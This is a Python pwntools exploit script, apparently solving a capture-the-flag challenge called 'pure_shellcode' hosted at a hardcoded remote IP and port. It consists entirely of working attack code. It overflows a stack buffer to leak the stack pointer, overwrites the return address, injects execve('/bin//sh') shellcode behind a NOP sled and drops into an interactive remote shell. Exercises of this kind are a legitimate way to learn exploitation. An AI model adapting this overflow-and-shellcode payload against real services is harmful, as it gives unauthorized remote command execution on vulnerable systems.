#!/usr/bin/env python3
from pwn import *

BIN  = "./pure_shellcode"
IP   = "141.85.224.106"
PORT = "31340"

context.bits = 64
context.endian = 'little'
context.binary = BIN
# context.log_level = 'debug'
# io = process(BIN)
# gdb.attach(target=io)

io = remote(IP, PORT)

main_addr_bin = b"\x00\x10\x40"

# Stage 1, get the stack address and overwrite the RIP with the start of main
io.send(b"hello".ljust(0x40, b"\x41") + b"\x00" * 8 + main_addr_bin.ljust(0, b"\x00"))

buffer = io.recv(0x40)
rbp = io.recv(8)
rip = io.recv(8)
rsp = io.recv(8)
io.recv()   # the rest of the information (unimportant)

# For context
print("Old RBP is 0: ", hex(unpack(rbp)))
print("Old RIP points after the call to main: ", hex(unpack(rip)))
print("Old RSP points to the beginning of the stack: ", hex(unpack(rsp))) # This is of interest

# Stage 2, send the shellcode

shellcode = b'\x48\x81\xec\xff\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x99\x53\x54\x5f\x52\x57\x54\x5e\x48\x31\xc0\xb0\x3b\x0f\x05'
new_rip = pack((unpack(rsp, 64) - 0x40))

# Whole payload
payload = b'\x90' * 0x10 + shellcode.ljust(0x30, b"\x90") + b"\x00" * 8 + new_rip + rsp

# Send the payload
io.send(payload)

# Recv same information
buffer = io.recv(0x40)
rbp = io.recv(8)
rip = io.recv(8)
rsp = io.recv(8)
io.recv(timeout=0.5)

# Get the shell
io.interactive()

